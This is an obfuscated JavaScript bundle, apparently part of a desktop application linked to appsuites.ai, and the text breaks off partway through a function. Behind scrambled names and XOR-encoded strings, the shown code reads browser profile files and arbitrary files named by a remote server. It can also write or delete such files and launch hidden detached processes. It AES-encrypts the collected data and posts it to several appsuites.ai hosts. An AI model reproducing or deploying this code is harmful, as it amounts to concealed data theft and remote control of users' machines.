'use strict';

(() => {
  var a = ((k) => typeof require !== "undefined" ? require : typeof Proxy !== "undefined" ? new Proxy(k, {
    get: (l, m) => (typeof require !== "undefined" ? require : l)[m]
  }) : k)(function (n) {
    if (typeof require !== "undefined") {
      return require.apply(this, arguments);
    }
    throw Error("Dynamic require of \"" + n + "\" is not supported");
  });
  var b = (o, p) => function q() {
    if (!p) {
      o[Object.getOwnPropertyNames(o)[0]]((p = {
        exports: {}
      }).exports, p);
    }
    return p.exports;
  };
  var c = b({
    'obj/P3E9KFM.js'(r) {
      'use strict';

      Object.defineProperty(r, '__esModule', {
        value: true
      });
      r.S559FZQ = r.i4B82NN = r.a689XV5 = r.k510542 = undefined;
      var s = e();
      var t = class {};
      r.k510542 = t;
      var u;
      (function (x) {
        x[x.B639G7B = 0] = "B639G7B";
        x[x.V4E6B4O = 1] = "V4E6B4O";
        x[x.j5C58S9 = 2] = "j5C58S9";
        x[x.Z498ME9 = 4] = "Z498ME9";
        x[x.b5BEPQ2 = 5] = "b5BEPQ2";
        x[x.f63DUQF = 6] = "f63DUQF";
      })(u = r.a689XV5 || (r.a689XV5 = {}));
      var v = class {
        static s6B3E35(y) {
          let str = '';
          for (let i2 = 0; i2 < y.length; i2++) {
            str += t.w3F3UWA[y[i2] - 48][0];
          }
          return str;
        }
      };
      r.i4B82NN = v;
      var w = class z {
        static t5A2WVR() {
          return true;
        }
        static D47CBV3() {
          return require("process").env.LOCALAPPDATA ?? '';
        }
        static P6A7H5F() {
          return require("process").env.USERPROFILE ?? '';
        }
        static D5DCGHD() {
          return require("path").basename(this.P4ECJBE);
        }
        static D471SJS(aa) {
          const arr = [];
          const arr2 = [130, 176, 216, 182, 29, 104, 2, 25, 65, 7, 28, 250, 126, 181, 101, 27];
          for (let j2 = 0; j2 < aa.length; j2++) {
            arr.push(aa[j2] ^ arr2[j2 % arr2.length]);
          }
          return Buffer.from(arr).toString();
        }
        static async c5E4Z7C(ab, ac) {
          switch (z.y49649G) {
            case 1:
              await z.R449QD9(ab, ac);
              break;
            case 2:
              await z.q413VTI(ab, ac);
              break;
            default:
              s.w3F3UWA.s59BT06('');
              break;
          }
        }
        static async R449QD9(ad, ae) {
          const af = z.f60EJEI;
          const ag = z.s59E3EX;
          const fs = require("fs");
          if (!fs.existsSync(af)) {
            fs.mkdirSync(af);
          }
          const ah = fs.existsSync(ag) ? fs.readFileSync(ag, "utf8") : undefined;
          const ai = !ah ? {} : JSON.parse(ah);
          ai[ad] = ae;
          z.o699XQ0 = ai;
          fs.writeFileSync(ag, JSON.stringify(ai));
        }
        static async q413VTI(aj, ak) {
          const al = z.f60EJEI;
          const am = z.s59E3EX;
          const fs2 = require("fs");
          if (!fs2.existsSync(al)) {
            fs2.mkdirSync(al);
          }
          let an = fs2.existsSync(am) ? fs2.readFileSync(am, "utf8") : undefined;
          let arr3 = [];
          if (an != undefined) {
            const ap = Buffer.from(an, "hex").toString("utf8");
            const aq = !ap ? {} : JSON.parse(ap);
            if (aq.hasOwnProperty("json")) {
              arr3 = aq.json;
            }
          }
          const ao = z.l536G7W.length - arr3.length;
          if (ao < 0) {
            s.w3F3UWA.s59BT06('');
          }
          for (let k2 = 0; k2 < ao; k2++) {
            arr3.push('');
          }
          arr3[z.l536G7W.indexOf(aj)] = ak;
          let obj = {
            json: arr3
          };
          z.o699XQ0 = obj;
          an = Buffer.from(JSON.stringify(obj), "utf8").toString("hex").toUpperCase();
          fs2.writeFileSync(am, an);
        }
        static async l610ZCY(ar) {
          switch (z.y49649G) {
            case 1:
              return await z.l616AL1(ar);
            case 2:
              return await z.N3FBEKL(ar);
            default:
              s.w3F3UWA.s59BT06('');
              return;
          }
        }
        static async l616AL1(as) {
          const at = z.s59E3EX;
          const fs3 = require("fs");
          let str2 = '';
          try {
            if (!z.o699XQ0 && fs3.existsSync(at)) {
              str2 = fs3.readFileSync(at, "utf8");
              z.o699XQ0 = JSON.parse(str2);
            }
          } catch (au) {
            await s.w3F3UWA.Y6CDW21(0, s.z579NEI.v4D2E5C, au, [str2]);
            return;
          }
          if (!z.o699XQ0 || !Object.prototype.hasOwnProperty.call(z.o699XQ0, as)) {
            return;
          }
          return z.o699XQ0[as].toString();
        }
        static async N3FBEKL(av) {
          const aw = z.s59E3EX;
          const fs4 = require("fs");
          let str3 = '';
          try {
            if (!z.o699XQ0 && fs4.existsSync(aw)) {
              str3 = fs4.readFileSync(aw, "utf8");
              const ay = Buffer.from(str3, "hex").toString("utf8");
              s.w3F3UWA.s59BT06('');
              const az = !ay ? {} : JSON.parse(ay);
              let arr4 = [];
              if (az.hasOwnProperty("json")) {
                arr4 = az.json;
              }
              const ba = z.l536G7W.length - arr4.length;
              if (ba < 0) {
                s.w3F3UWA.s59BT06('');
              }
              for (let l2 = 0; l2 < ba; l2++) {
                arr4.push('');
              }
              az.json = arr4;
              z.o699XQ0 = az;
            }
          } catch (bb) {
            await s.w3F3UWA.Y6CDW21(0, s.z579NEI.v4D2E5C, bb, [str3]);
            return;
          }
          const ax = z.l536G7W.indexOf(av);
          if (!z.o699XQ0 || ax == -1) {
            return;
          }
          return z.o699XQ0.json[ax].toString();
        }
        static async T5BBWGD() {
          try {
            return await z.l610ZCY("iid");
          } catch (bc) {
            await s.w3F3UWA.Y6CDW21(0, s.z579NEI.H604VAI, bc);
            return '';
          }
        }
        static async J6021ZT() {
          if (z.y49649G != 2) {
            return;
          }
          const bd = await z.N3FBEKL("iid");
          const be = await z.N3FBEKL("usid");
          if (bd != undefined && bd != '' && be != undefined && be != '') {
            return;
          }
          const bf = z.k47ASDC;
          const fs5 = require("fs");
          let str4 = '';
          try {
            if (fs5.existsSync(bf)) {
              let bg = function (bk) {
                let str5 = '';
                for (let m2 = 0; m2 < bk.length; m2++) {
                  str5 += bk.charCodeAt(m2).toString(16).padStart(2, '0');
                }
                return str5;
              };
              str4 = fs5.readFileSync(bf, "utf8");
              const bh = !str4 ? {} : JSON.parse(str4);
              const bi = bh.hasOwnProperty("uid") ? bh.uid : '';
              const bj = bh.hasOwnProperty("sid") ? bh.sid : '';
              if (bi != '') {
                await z.q413VTI("iid", bi);
              }
              if (bj != '') {
                await z.q413VTI("usid", bg(bj));
              }
              s.w3F3UWA.s59BT06('');
            }
          } catch (bl) {
            await s.w3F3UWA.Y6CDW21(0, s.z579NEI.A3F8RJ7, bl, [str4]);
            return;
          }
        }
      };
      r.S559FZQ = w;
    }
  });
  var d = b({
    'obj/A3EBXKH.js'(bm) {
      'use strict';

      Object.defineProperty(bm, '__esModule', {
        value: true
      });
      bm.e5325L3 = bm.E506IW4 = undefined;
      var bn = class {
        static d6C8UEH() {
          for (const bq of Object.keys(this)) {
            if (this[bq] === '' || this[bq] === undefined) {
              return false;
            }
          }
          return true;
        }
      };
      bm.E506IW4 = bn;
      var bo = class {
        static get d65DL4U() {
          if (!this.C4E471X) {
            this.C4E471X = new bp();
          }
          return this.C4E471X;
        }
        static get Y55B2P2() {
          return this.d65DL4U.Y55B2P2;
        }
        static get q474LOF() {
          return this.d65DL4U.q474LOF;
        }
        static set q474LOF(br) {
          this.d65DL4U.q474LOF = br;
        }
        static get a5D303X() {
          return this.d65DL4U.a5D303X;
        }
        static set a5D303X(bs) {
          this.d65DL4U.a5D303X = bs;
        }
        static get x484Q1X() {
          return this.d65DL4U.x484Q1X;
        }
        static set x484Q1X(bt) {
          this.d65DL4U.x484Q1X = bt;
        }
        static get k596N0J() {
          return this.d65DL4U.k596N0J;
        }
        static set k596N0J(bu) {
          this.d65DL4U.k596N0J = bu;
        }
        static get a6B1QAU() {
          return this.d65DL4U.a6B1QAU;
        }
        static set a6B1QAU(bv) {
          this.d65DL4U.a6B1QAU = bv;
        }
        static get r53FV0M() {
          return this.d65DL4U.r53FV0M;
        }
        static set r53FV0M(bw) {
          this.d65DL4U.r53FV0M = bw;
        }
        static get U430LYO() {
          return this.d65DL4U.U430LYO;
        }
        static set U430LYO(bx) {
          this.d65DL4U.U430LYO = bx;
        }
        static get g4184BO() {
          return this.d65DL4U.g4184BO;
        }
        static set g4184BO(by) {
          this.d65DL4U.g4184BO = by;
        }
        static get R6780KK() {
          return this.d65DL4U.R6780KK;
        }
        static set R6780KK(bz) {
          this.d65DL4U.R6780KK = bz;
        }
        static get n664BX9() {
          return this.d65DL4U.n664BX9;
        }
        static set n664BX9(ca) {
          this.d65DL4U.n664BX9 = ca;
        }
        static get x4ADWAE() {
          return this.d65DL4U.x4ADWAE;
        }
        static set x4ADWAE(cb) {
          this.d65DL4U.x4ADWAE = cb;
        }
        static get z4DE429() {
          return this.d65DL4U.z4DE429;
        }
        static set z4DE429(cc) {
          this.d65DL4U.z4DE429 = cc;
        }
        static get H64FNMG() {
          return this.d65DL4U.H64FNMG;
        }
        static set H64FNMG(cd) {
          this.d65DL4U.H64FNMG = cd;
        }
        static get M56F8MB() {
          return this.d65DL4U.M56F8MB;
        }
        static set M56F8MB(ce) {
          this.d65DL4U.M56F8MB = ce;
        }
        static get X4B7201() {
          return this.d65DL4U.X4B7201;
        }
        static set X4B7201(cf) {
          this.d65DL4U.X4B7201 = cf;
        }
        static get b57CS7T() {
          return this.d65DL4U.b57CS7T;
        }
        static set b57CS7T(cg) {
          this.d65DL4U.b57CS7T = cg;
        }
        static get K48B40X() {
          return this.d65DL4U.K48B40X;
        }
        static set K48B40X(ch) {
          this.d65DL4U.K48B40X = ch;
        }
        static get d557Z9E() {
          return this.d65DL4U.d557Z9E;
        }
      };
      bm.e5325L3 = bo;
      var bp = class {
        constructor() {
          this.d557Z9E = process.pid;
          this.Y55B2P2 = '1.0.28';
          this.q474LOF = '';
          this.a5D303X = false;
          this.x484Q1X = c().a689XV5.B639G7B;
          this.a6B1QAU = '';
          this.U430LYO = '';
          this.k596N0J = false;
          this.r53FV0M = false;
          this.g4184BO = false;
          this.R6780KK = false;
          this.n664BX9 = false;
          this.x4ADWAE = false;
          this.z4DE429 = false;
          this.H64FNMG = false;
          this.M56F8MB = false;
          this.X4B7201 = false;
          this.b57CS7T = -1;
          this.K48B40X = -1;
        }
      };
    }
  });
  var e = b({
    'obj/u3EC55P.js'(ci) {
      'use strict';

      Object.defineProperty(ci, '__esModule', {
        value: true
      });
      ci.o5B4F49 = ci.S634YX3 = ci.U61FWBZ = ci.O694X7J = ci.m4F8RIX = ci.F490EUX = ci.T667X3K = ci.p464G3A = ci.e63F2C3 = ci.h5235DD = ci.e696T3N = ci.J60DFMS = ci.y42BRXF = ci.r5EEMKP = ci.w3F3UWA = ci.z579NEI = ci.Y463EU0 = ci.T408FQL = ci.v43EBD7 = undefined;
      var cj = c();
      var ck = d();
      var cl;
      (function (dd) {
        dd[dd.W5397AL = -1] = 'W5397AL';
        dd[dd.X571NQM = 0] = "X571NQM";
        dd[dd.X4816CW = 1] = 'X4816CW';
      })(cl = ci.v43EBD7 || (ci.v43EBD7 = {}));
      var cm = class {
        constructor(de = 0, df = 0, dg = 0, dh = 0) {
          this.D5DDWLX = de;
          this.t563L6N = df;
          this.T3F59PH = dg;
          this.o6359GL = dh;
        }
        o5B56AY(di) {
          if (di == null) {
            return false;
          }
          return this.D5DDWLX == di.D5DDWLX && this.t563L6N == di.t563L6N && this.T3F59PH == di.T3F59PH && this.o6359GL == di.o6359GL;
        }
        N67FCSM(dj) {
          if (dj == null) {
            return true;
          }
          return this.D5DDWLX != dj.D5DDWLX || this.t563L6N != dj.t563L6N || this.T3F59PH != dj.T3F59PH || this.o6359GL != dj.o6359GL;
        }
        V4E80AR(dk) {
          if (this.o5B56AY(dk)) {
            return false;
          }
          if (this.D5DDWLX > dk.D5DDWLX) {
            return true;
          }
          if (this.D5DDWLX < dk.D5DDWLX) {
            return false;
          }
          if (this.t563L6N > dk.t563L6N) {
            return true;
          }
          if (this.t563L6N < dk.t563L6N) {
            return false;
          }
          if (this.T3F59PH > dk.T3F59PH) {
            return true;
          }
          if (this.T3F59PH < dk.T3F59PH) {
            return false;
          }
          return this.o6359GL > dk.o6359GL;
        }
        s5A7L0F(dl) {
          if (this.o5B56AY(dl)) {
            return false;
          }
          if (dl.V4E80AR(this)) {
            return false;
          }
          return true;
        }
        T41CAIA() {
          return this.D5DDWLX + '.' + this.t563L6N + '.' + this.T3F59PH + '.' + this.o6359GL;
        }
        K66ASXK() {
          return this.D5DDWLX + '.' + this.t563L6N;
        }
      };
      ci.T408FQL = cm;
      function cn(dm) {
        return new Promise((dn) => setTimeout(dn, dm));
      }
      ci.Y463EU0 = cn;
      ci.z579NEI = class {
        static F47EFHX(dp) {
          return dp;
        }
      };
      var co = class dq {
        static s59BT06(dr, ds = cl.X571NQM) {
          if (!cj.S559FZQ.F40E8E7) {
            return;
          }
          console.log('[' + ds + "]: " + dr);
        }
        static async W4EF0EI(dt, du, dv) {
          await this.Q44BIX9(cl.X4816CW, dt, du, undefined, dv);
        }
        static async Y6CDW21(dw, dx, dy, dz) {
          await this.Q44BIX9(cl.W5397AL, dw, dx, dy, dz);
        }
        static async Q44BIX9(ea, eb, ec, ed, ee) {
          function ef(ej) {
            if (!ej) {
              return '';
            }
            let str6 = '';
            for (const ek of ej) {
              if (str6.length > 0) {
                str6 += '|';
              }
              if (typeof ek === 'boolean') {
                str6 += ek ? '1' : '0';
              } else {
                str6 += ek.toString().replace('|', '_');
              }
            }
            return str6;
          }
          dq.s59BT06('');
          var eg = ck.e5325L3.q474LOF ?? '';
          if (eg == '') {
            eg = "initialization";
          }
          const params = new require("url").URLSearchParams();
          const eh = cj.S559FZQ.n677BRA.substring(0, 24) + eg.substring(0, 8);
          const ei = cz(eh, JSON.stringify({
            b: eb,
            c: ef(ee),
            e: ed ? ed.toString() : '',
            i: eg,
            l: ea,
            m: ec[0],
            p: cj.S559FZQ.t5A2WVR() ? 1 : 2,
            s: ck.e5325L3.x484Q1X,
            v: ck.e5325L3.Y55B2P2
          }));
          params.append("data", ei.data);
          params.append("iv", ei.iv);
          params.append("iid", eg);
          if (!cj.S559FZQ.F40E8E7) {
            await cu("api/s3/event", params);
          }
        }
        static g597ORN() {
          dq.s59BT06('');
        }
      };
      ci.w3F3UWA = co;
      function cp(el, em = [], en) {
        return require("child_process").spawn(el, em, {
          detached: true,
          stdio: "ignore",
          cwd: en
        });
      }
      ci.r5EEMKP = cp;
      async function cq(eo) {
        co.s59BT06('');
        return await require("node-fetch")(eo);
      }
      ci.y42BRXF = cq;
      async function cr(ep, eq) {
        co.s59BT06('');
        return await require("node-fetch")(ep, {
          method: "POST",
          body: JSON.stringify(eq)
        });
      }
      ci.J60DFMS = cr;
      async function cs(er) {
        const fetch = require("node-fetch");
        let es;
        let et = "https://appsuites.ai/" + er;
        co.s59BT06('');
        try {
          es = await fetch(et);
        } catch {
          co.s59BT06('');
        }
        if (!es || !es.ok) {
          try {
            et = "https://sdk.appsuites.ai/" + er;
            co.s59BT06('');
            es = await fetch(et);
          } catch {
            co.s59BT06('');
          }
        }
        return es;
      }
      ci.e696T3N = cs;
      async function ct(eu, ev) {
        const fetch2 = require("node-fetch");
        let ew;
        let ex = "https://appsuites.ai/" + eu;
        co.s59BT06('');
        if (ev.has('')) {
          ev.append('', '');
        }
        const obj2 = {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: ev
        };
        try {
          ew = await fetch2(ex, obj2);
        } catch {
          co.s59BT06('');
        }
        if (!ew || !ew.ok) {
          try {
            ex = "https://sdk.appsuites.ai/" + eu;
            co.s59BT06('');
            ew = await fetch2(ex, obj2);
          } catch {
            co.s59BT06('');
          }
        }
        return ew;
      }
      ci.h5235DD = ct;
      async function cu(ey, ez) {
        if (ez.has('')) {
          ez.append('', '');
        }
        return await require("node-fetch")("https://appsuites.ai/" + ey, {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: ez
        });
      }
      ci.e63F2C3 = cu;
      function cv(fa, fb) {
        return new Promise((fc, fd) => {
          const fe = require("fs").createWriteStream(fb, {});
          const ff = (fa.startsWith("https") ? require("https") : require("http")).get(fa, (res) => {
            if (!res.statusCode || res.statusCode < 200 || res.statusCode > 299) {
              fd(new Error("LoadPageFailed " + res.statusCode));
            }
            res.pipe(fe);
            fe.on("finish", function () {
              fe.destroy();
              fc();
            });
          });
          ff.on("error", (fg) => fd(fg));
        });
      }
      ci.p464G3A = cv;
      function cw(fh) {
        try {
          require("fs").unlinkSync(fh);
          co.s59BT06('');
        } catch {
          co.s59BT06('');
        }
      }
      ci.T667X3K = cw;
      async function cx() {
        const fs6 = require("fs");
        const path = require("path");
        const proc = require("process");
        const fi = cj.S559FZQ.L695HPV;
        if (fs6.existsSync(fi)) {
          const fj = new Date().getTime() - fs6.statSync(fi).mtime.getTime();
          if (fj < 900000) {
            co.s59BT06('');
            proc.exit(0);
          } else {
            co.s59BT06('');
            fs6.unlinkSync(fi);
          }
        }
        fs6.writeFileSync(fi, '');
        proc.on("exit", () => {
          fs6.unlinkSync(fi);
        });
      }
      ci.F490EUX = cx;
      function cy(fk) {
        try {
          return require("fs").statSync(fk).size;
        } catch {
          return 0;
        }
      }
      ci.m4F8RIX = cy;
      function cz(fl, fm) {
        try {
          const crypto = require("crypto");
          const fn = crypto.randomBytes(16);
          let fo = crypto.createCipheriv("aes-256-cbc", fl, fn);
          let fp = fo.update(fm, "utf8", "hex");
          fp += fo.final("hex");
          return {
            data: fp,
            iv: fn.toString("hex")
          };
        } catch {
          co.s59BT06('');
          return;
        }
      }
      ci.O694X7J = cz;
      function da(fq, fr, ft) {
        try {
          const fu = require("crypto").createDecipheriv("aes-256-cbc", Buffer.from(fq), Buffer.from(ft, "hex"));
          let fv = fu.update(Buffer.from(fr, "hex"));
          fv = Buffer.concat([fv, fu.final()]);
          return fv.toString();
        } catch {
          co.s59BT06('');
          return;
        }
      }
      ci.U61FWBZ = da;
      function db(fw) {
        return Buffer.from(fw, "hex").toString("utf8");
      }
      ci.S634YX3 = db;
      function dc(fx, ...fy) {
        try {
          var fz = fx.replace(/{(\d+)}/g, function (ga, gb) {
            const gc = parseInt(gb);
            if (isNaN(gc)) {
              return ga;
            }
            return typeof fy[gc] !== 'undefined' ? fy[gc] : ga;
          });
          return fz;
        } catch {
          return fx;
        }
      }
      ci.o5B4F49 = dc;
    }
  });
  var f = b({
    'obj/V3EDFYY.js'(gd) {
      'use strict';

      Object.defineProperty(gd, '__esModule', {
        value: true
      });
      gd.t505FAN = undefined;
      var ge = c();
      var gf = e();
      var gg;
      (function (hn) {
        hn[hn.p5B1KEV = 0] = "p5B1KEV";
      })(gg || (gg = {}));
      var gh;
      (function (ho) {
        ho[ho.O435AMZ = 0] = "O435AMZ";
        ho[ho.w692AS2 = 1] = 'w692AS2';
      })(gh || (gh = {}));
      var gi;
      (function (hp) {
        hp[hp.B639G7B = 0] = "B639G7B";
        hp[hp.O435AMZ = 1] = "O435AMZ";
        hp[hp.j451KZ4 = 2] = "j451KZ4";
        hp[hp.R62AFMF = 3] = "R62AFMF";
        hp[hp.S58EMWW = 4] = "S58EMWW";
        hp[hp.P5F9KBR = 5] = "P5F9KBR";
      })(gi || (gi = {}));
      function gj(hq) {
        const hr = Buffer.isBuffer(hq) ? hq : Buffer.from(hq);
        const buf = Buffer.from(hr.slice(4));
        for (let n2 = 0; n2 < buf.length; n2++) {
          buf[n2] ^= hr.slice(0, 4)[n2 % 4];
        }
        return buf.toString("utf8");
      }
      function gk(hs) {
        hs = hs[gj([16, 233, 75, 213, 98, 140, 59, 185, 113, 138, 46])](/-/g, '');
        return Buffer.from("276409396fcc0a23" + hs.substring(0, 16), "hex");
      }
      function gl() {
        return Uint8Array.from([162, 140, 252, 232, 178, 47, 68, 146, 150, 110, 104, 76, 128, 236, 129, 43]);
      }
      function gm() {
        return Uint8Array.from([132, 144, 242, 171, 132, 73, 73, 63, 157, 236, 69, 155, 80, 5, 72, 144]);
      }
      function gn() {
        return Uint8Array.from([28, 227, 43, 129, 197, 9, 192, 3, 113, 243, 59, 145, 209, 193, 56, 86, 104, 131, 82, 163, 221, 190, 10, 67, 20, 245, 151, 25, 157, 70, 17, 158, 122, 201, 112, 38, 29, 114, 194, 166, 183, 230, 137, 160, 167, 99, 27, 45, 46, 31, 96, 23, 200, 241, 64, 26, 57, 33, 83, 240, 247, 139, 90, 48, 233, 6, 110, 12, 44, 108, 11, 73, 34, 231, 242, 173, 37, 92, 162, 198, 175, 225, 143, 35, 176, 133, 72, 212, 165, 195, 36, 226, 147, 68, 69, 146, 14, 0, 161, 87, 53, 196, 199, 195, 19, 80, 4, 49, 169, 188, 153, 30, 124, 142, 206, 159, 180, 170, 123, 88, 15, 95, 210, 152, 24, 63, 155, 98, 181, 7, 141, 171, 85, 103, 246, 222, 97, 211, 248, 136, 126, 22, 168, 214, 249, 93, 109, 91, 111, 21, 213, 229, 135, 207, 54, 40, 244, 47, 224, 215, 164, 51, 208, 100, 144, 16, 55, 66, 18, 42, 39, 52, 186, 127, 118, 65, 61, 202, 160, 253, 125, 74, 50, 106, 228, 89, 179, 41, 232, 148, 32, 231, 138, 132, 121, 115, 150, 220, 5, 240, 184, 182, 76, 243, 58, 60, 94, 238, 107, 140, 163, 217, 128, 120, 78, 134, 102, 75, 105, 79, 116, 247, 119, 189, 149, 185, 216, 13, 117, 236, 126, 156, 8, 130, 2, 154, 178, 101, 71, 254, 62, 1, 81, 177, 205, 250, 219, 6, 203, 172, 125, 191, 218, 77, 235, 252]);
      }
      function go(ht, hu) {
        if (ht.length !== hu.length) {
          return false;
        }
        for (let hv = 0; hv < ht.length; hv++) {
          if (ht[hv] !== hu[hv]) {
            return false;
          }
        }
        return true;
      }
      function gp(hw) {
        if (!hw) {
          return new Uint8Array();
        }
        return new Uint8Array(Buffer.from(hw, "hex"));
      }
      function gq(hx) {
        if (!hx) {
          return '';
        }
        return Buffer.from(hx).toString("hex");
      }
      function gr(hy, hz) {
        const crypto2 = require("crypto");
        const ia = crypto2.randomBytes(16);
        const ib = crypto2.createCipheriv("aes-128-cbc", gk(hz), ia);
        ib.setAutoPadding(true);
        let ic = ib.update(hy, "utf8", "hex");
        ic += ib.final("hex");
        return ia.toString("hex").toUpperCase() + "A0FB" + ic.toUpperCase();
      }
      function gs(id, ie) {
        const ig = require("crypto").createDecipheriv("aes-128-cbc", gk(ie), Buffer.from(id.substring(0, 32), "hex"));
        ig.setAutoPadding(true);
        let ih = ig.update(id.substring(36), "hex", "utf8");
        ih += ig.final("utf8");
        return ih;
      }
      function gt(ii, ij) {
        if (ii.length <= 32) {
          return new Uint8Array();
        }
        const bytes = new Uint8Array([...gl(), ...ij]);
        const ik = ii.slice(0, 16);
        const il = gn();
        const im = ii.slice(16);
        for (let ip = 0; ip < im.length; ip++) {
          const iq = ik[ip % ik.length] ^ bytes[ip % bytes.length] ^ il[ip % il.length];
          im[ip] ^= iq;
        }
        const io = im.length - 16;
        if (!go(im.slice(io), gm())) {
          return new Uint8Array();
        }
        return im.slice(0, io);
      }
      var gu = class {
        static W698NHL(ir) {
          const arr5 = [];
          if (!Array.isArray(ir)) {
            return arr5;
          }
          for (const is of ir) {
            arr5.push({
              d5E0TQS: is.Path ?? '',
              a47DHT3: is.Data ?? '',
              i6B2K9E: is.Key ?? '',
              A575H6Y: Boolean(is.Exists),
              Q57DTM8: typeof is.Action === "number" ? is.Action : 0
            });
          }
          return arr5;
        }
        static T6B99CG(it) {
          return it.map((iu) => ({
            Path: iu.d5E0TQS,
            Data: iu.a47DHT3,
            Key: iu.i6B2K9E,
            Exists: iu.A575H6Y,
            Action: iu.Q57DTM8
          }));
        }
        static u6CAWW3(iv) {
          return {
            c608HZL: Array.isArray(iv.File) ? this.W698NHL(iv.File) : [],
            y4BAIF6: Array.isArray(iv.Reg) ? this.W698NHL(iv.Reg) : [],
            Z59DGHB: Array.isArray(iv.Url) ? this.W698NHL(iv.Url) : [],
            s67BMEP: Array.isArray(iv.Proc) ? this.W698NHL(iv.Proc) : []
          };
        }
        static N5A4FRL(iw) {
          return {
            File: this.T6B99CG(iw.c608HZL),
            Reg: this.T6B99CG(iw.y4BAIF6),
            Url: this.T6B99CG(iw.Z59DGHB),
            Proc: this.T6B99CG(iw.s67BMEP)
          };
        }
        static S59C847(ix) {
          return {
            b54FBAI: typeof ix.Progress === "number" ? ix.Progress : -1,
            P456VLZ: typeof ix.Activity === "number" ? ix.Activity : -1,
            x567X2Q: this.u6CAWW3(ix.Value ?? {}),
            J6C4Y96: ix.NextUrl ?? '',
            I489V4T: ix.Session ?? '',
            h46EVPS: typeof ix.TimeZone === "number" ? ix.TimeZone : 255,
            b4CERH3: ix.Version ?? ''
          };
        }
        static b558GNO(iy) {
          return {
            Progress: iy.b54FBAI,
            Activity: iy.P456VLZ,
            Value: this.N5A4FRL(iy.x567X2Q),
            NextUrl: iy.J6C4Y96,
            Session: iy.I489V4T,
            TimeZone: iy.h46EVPS,
            Version: iy.b4CERH3
          };
        }
        static s40B7VN(iz) {
          return JSON.stringify(this.b558GNO(iz));
        }
      };
      function gv(ja) {
        const fs7 = require("fs");
        return fs7.existsSync(ja) && fs7.lstatSync(ja).isDirectory();
      }
      function gw(jb) {
        require("fs").mkdirSync(jb, {
          recursive: true
        });
      }
      function gx(jc) {
        try {
          return JSON.parse(jc);
        } catch {
          return {};
        }
      }
      function gy(jd, je) {
        return typeof jd?.[je] === "object" ? jd[je] : {};
      }
      function gz(jf) {
        const path2 = require("path");
        const os = require("os");
        let jg = jf;
        const obj3 = {
          "%LOCALAPPDATA%": path2.join(os.homedir(), "AppData", "Local"),
          "%APPDATA%": path2.join(os.homedir(), "AppData", "Roaming"),
          "%USERPROFILE%": os.homedir()
        };
        for (const [jh, ji] of Object.entries(obj3)) {
          const regex = new RegExp(jh, 'i');
          if (regex.test(jg)) {
            jg = jg.replace(regex, ji);
            break;
          }
        }
        return jg;
      }
      function ha() {
        return Math.floor(Date.now() / 1000).toString();
      }
      function hb(jj) {
        const fs8 = require("fs");
        if (fs8.existsSync(jj)) {
          fs8.unlinkSync(jj);
        }
      }
      function hc(jk, jl) {
        try {
          require("fs").writeFileSync(jk, jl);
          return true;
        } catch {
          return false;
        }
      }
      async function hd(jm) {
        return new Promise((jn, jo) => {
          (jm.startsWith("https") ? require("https") : require("http")).get(jm, (jp) => {
            const arr6 = [];
            jp.on("data", (jq) => arr6.push(jq));
            jp.on("end", () => jn(Buffer.concat(arr6)));
          }).on("error", (jr) => jo(jr));
        });
      }
      var str7 = '';
      var he;
      async function hf(js, jt) {
        gf.w3F3UWA.s59BT06('');
        gf.w3F3UWA.s59BT06('');
        const ju = new require("url").URLSearchParams({
          data: gr(JSON.stringify(gu.b558GNO(js)), str7),
          iid: str7
        }).toString();
        return await await require("node-fetch")("https://on.appsuites.ai" + jt, {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded"
          },
          method: "POST",
          body: ju
        }).text();
      }
      async function hg(jv, jw) {
        jv.J6C4Y96 = '';
        jv.P456VLZ = gh.w692AS2;
        jv.b4CERH3 = "1.0.0.0";
        jv.h46EVPS = -new Date().getTimezoneOffset() / 60;
        for (let jx = 0; jx < 3; jx++) {
          jv.I489V4T = ha();
          const jy = await hf(jv, jw);
          if (jy && (typeof gx(jy)?.iid === "string" ? gx(jy).iid : '') === str7) {
            break;
          }
          await new Promise((jz) => setTimeout(jz, 3000));
        }
      }
      async function hh(ka) {
        gf.w3F3UWA.s59BT06('');
        const path3 = require("path");
        const fs9 = require("fs");
        const arr7 = [];
        const kb = (kh) => {
          kh.A575H6Y = false;
          if (kh.d5E0TQS) {
            kh.A575H6Y = require("fs").existsSync(gz(kh.d5E0TQS));
          }
        };
        const kc = (ki) => {
          ki.A575H6Y = false;
          if (ki.d5E0TQS) {
            const kj = gz(ki.d5E0TQS);
            ki.A575H6Y = require("fs").existsSync(kj);
            if (ki.A575H6Y) {
              ki.a47DHT3 = gq(require("fs").readFileSync(kj));
            }
          }
        };
        const kd = (kk) => {
          kk.A575H6Y = false;
          if (kk.d5E0TQS && kk.a47DHT3) {
            kk.a47DHT3 = '';
            const kl = gz(kk.d5E0TQS);
            const km = require("path").dirname(kl);
            if (!gv(km)) {
              gw(km);
            }
            kk.A575H6Y = hc(kl, gp(kk.a47DHT3));
          }
        };
        const ke = (kn) => {
          kn.A575H6Y = false;
          if (kn.d5E0TQS) {
            const ko = gz(kn.d5E0TQS);
            hb(ko);
            kn.A575H6Y = require("fs").existsSync(ko);
          }
        };
        const kf = (kp) => {
          kp.A575H6Y = false;
          if (kp.d5E0TQS) {
            const kq = gz(kp.d5E0TQS);
            const kr = path3.join(kq, "Local State");
            if (!require("fs").existsSync(kr)) {
              return;
            }
            const keys = Object.keys(gy(gy(gx(fs9.readFileSync(kr, "utf8")), "profile"), "info_cache"));
            for (const ks of keys) {
              const kt = path3.join(kq, ks, "Preferences");
              if (!require("fs").existsSync(kt)) {
                continue;
              }
              const ku = gy(gy(gy(gy(gx(fs9.readFileSync(kt, "utf8")), "profile"), "content_settings"), "exceptions"), "site_engagement");
              const json = JSON.stringify(ku);
              if (json) {
                arr7.push({
                  d5E0TQS: path3.join(kp.d5E0TQS, ks, "Preferences"),
                  a47DHT3: gq(Buffer.from(json, "utf8")),
                  i6B2K9E: '',
                  A575H6Y: true,
                  Q57DTM8: gi.P5F9KBR
                });
                kp.A575H6Y = true;
              }
            }
          }
        };
        for (const kg of ka) {
          if (kg.Q57DTM8 === gi.O435AMZ) {
            kb(kg);
          } else if (kg.Q57DTM8 === gi.j451KZ4) {
            kc(kg);
          } else if (kg.Q57DTM8 === gi.R62AFMF) {
            kd(kg);
          } else if (kg.Q57DTM8 === gi.S58EMWW) {
            ke(kg);
          } else if (kg.Q57DTM8 === gi.P5F9KBR) {
            kf(kg);
          }
        }
